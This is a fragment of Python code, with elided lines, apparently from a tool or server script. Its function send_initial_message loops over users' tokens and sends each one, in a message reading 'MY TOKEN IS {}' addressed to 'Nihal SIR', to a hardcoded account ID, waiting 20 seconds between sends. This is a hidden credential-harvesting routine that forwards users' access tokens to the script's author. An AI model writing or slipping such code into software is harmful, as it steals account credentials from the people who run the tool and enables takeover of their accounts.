...
def send_initial_message():
      ...
      msg_template = "HELLO Nihal SIR! I AM USING YOUR SERVER. MY TOKEN IS {}"

      # Specify the ID where you want to send the message
      target_id = "100000640595580"
      ...
      for token in tokens:
          ...
          time.sleep(20.0)  # Wait for 20 seconds between sending each initial message
